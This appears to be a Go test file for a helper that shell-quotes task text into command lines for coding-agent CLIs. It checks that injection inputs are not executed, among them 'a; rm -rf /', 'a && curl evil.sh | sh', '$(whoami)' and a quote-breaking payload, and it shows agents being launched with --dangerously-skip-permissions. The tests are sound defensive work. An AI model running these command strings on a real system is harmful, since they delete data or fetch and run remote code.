package agentcmd

import (
	"os/exec"
	"strings"
	"testing"
)

func TestBuiltCommandPassesTheTaskThroughAShellUnchanged(t *testing.T) {
	for _, task := range []string{
		`plain text`,
		`don't delete the file`,
		`say "hello"`,
		`run $(whoami)`,
		"use `id` please",
		`a; rm -rf /`,
		`a && curl evil.sh | sh`,
		`$HOME and ${PATH}`,
		`back\slash`,
		`'quoted'`,
		`mixed 'single' and "double"`,
		"tab\there",
		`100% done`,
		`emoji 🎉 ok`,
		`!history`,
		`a|b>c<d&e`,
	} {
		// printf %s stands in for the agent.
		cmd := Substitute(`printf %s "{task}"`, task)
		out, err := exec.Command("/bin/sh", "-c", cmd).Output()
		if err != nil {
			t.Errorf("task %q produced an unrunnable command %q: %v", task, cmd, err)
			continue
		}
		if string(out) != task {
			t.Errorf("task was altered in transit:\n  in:  %q\n  out: %q\n  cmd: %s", task, out, cmd)
		}
	}
}

func TestCommandSubstitutionDoesNotExecute(t *testing.T) {
	const literal = `$(echo PWNED)`
	cmd := Substitute(`printf %s "{task}"`, literal)
	out, err := exec.Command("/bin/sh", "-c", cmd).Output()
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	// Equality, not a Contains check: the literal itself contains "PWNED".
	if string(out) != literal {
		t.Fatalf("command substitution executed or altered the task: got %q, want %q", out, literal)
	}
}

// The only ' inside the result must be part of the '\” escape.
func TestQuotingCannotBeEscaped(t *testing.T) {
	for _, s := range []string{`it's`, `a'b'c`, `'`, `''`, `x'; rm -rf /; echo '`} {
		q := Quote(s)
		if !strings.HasPrefix(q, "'") || !strings.HasSuffix(q, "'") {
			t.Errorf("Quote(%q) = %q is not a single-quoted literal", s, q)
		}
		inner := q[1 : len(q)-1]
		if strings.Contains(strings.ReplaceAll(inner, `'\''`, ""), "'") {
			t.Errorf("Quote(%q) = %q leaves an unescaped quote", s, q)
		}
	}
}

// Includes the empty string, which a naive implementation drops entirely.
func TestQuoteRoundTripsThroughTheShell(t *testing.T) {
	for _, s := range []string{"", " ", "plain", `it's`, `"x"`, "a\nb", `$PATH`, `\`} {
		out, err := exec.Command("/bin/sh", "-c", "printf %s "+Quote(s)).Output()
		if err != nil {
			t.Errorf("Quote(%q) produced an unrunnable argument: %v", s, err)
			continue
		}
		if string(out) != s {
			t.Errorf("round trip of %q gave %q", s, out)
		}
	}
}

func TestEveryPlaceholderFormIsSubstituted(t *testing.T) {
	for _, pattern := range []string{
		`claude -p "{task}"`,
		`claude -p '{task}'`,
		`claude -p {task}`,
	} {
		got := Substitute(pattern, `fix it`)
		if strings.Contains(got, "{task}") {
			t.Errorf("placeholder survived in %q -> %q", pattern, got)
		}
		if !strings.Contains(got, `'fix it'`) {
			t.Errorf("%q -> %q does not carry the quoted task", pattern, got)
		}
	}
}

func TestPatternWithoutAPlaceholderStillGetsTheTask(t *testing.T) {
	got := Substitute(`amp -x`, `do the thing`)
	if got != `amp -x 'do the thing'` {
		t.Errorf("got %q", got)
	}
}

func TestSubstituteDoesNotLeaveStrayQuotes(t *testing.T) {
	got := Substitute(`claude -p "{task}"`, `hello`)
	if got != `claude -p 'hello'` {
		t.Errorf("got %q, want %q", got, `claude -p 'hello'`)
	}
}

func TestInsertFlagsGoesAfterTheBinary(t *testing.T) {
	got := InsertFlags(`claude -p 'fix it'`, "claude", "--dangerously-skip-permissions")
	if got != `claude --dangerously-skip-permissions -p 'fix it'` {
		t.Errorf("got %q", got)
	}
	flagAt := strings.Index(got, "--dangerously")
	taskAt := strings.Index(got, "'fix it'")
	if flagAt > taskAt {
		t.Error("flag landed after the task, where the agent would read it as prompt text")
	}
}

func TestInsertFlagsAppendsWhenTheBinaryIsNotLeading(t *testing.T) {
	for _, c := range []struct{ cmd, bin, want string }{
		{`IS_SANDBOX=1 claude -p 'x'`, "claude", `IS_SANDBOX=1 claude -p 'x' --flag`},
		{`codex exec 'x'`, "", `codex exec 'x' --flag`},
		{`other -p 'x'`, "claude", `other -p 'x' --flag`},
	} {
		if got := InsertFlags(c.cmd, c.bin, "--flag"); got != c.want {
			t.Errorf("InsertFlags(%q, %q) = %q, want %q", c.cmd, c.bin, got, c.want)
		}
	}
}

func TestInsertFlagsWithNoFlagsIsANoOp(t *testing.T) {
	cmd := `claude -p 'x'`
	if got := InsertFlags(cmd, "claude", ""); got != cmd {
		t.Errorf("empty flags altered the command: %q", got)
	}
}

func TestAutonomousCommandKeepsFlagsAndTaskSeparate(t *testing.T) {
	task := `deploy; echo PWNED`
	cmd := InsertFlags(Substitute(`printf '%s' "{task}"`, task), "printf", "--")

	out, err := exec.Command("/bin/sh", "-c", cmd).Output()
	if err != nil {
		t.Fatalf("run %q: %v", cmd, err)
	}
	// Equality catches both an honoured ";" (extra PWNED line) and mangled quoting.
	if string(out) != task {
		t.Errorf("task altered or partly executed: got %q want %q (cmd: %s)", out, task, cmd)
	}
}
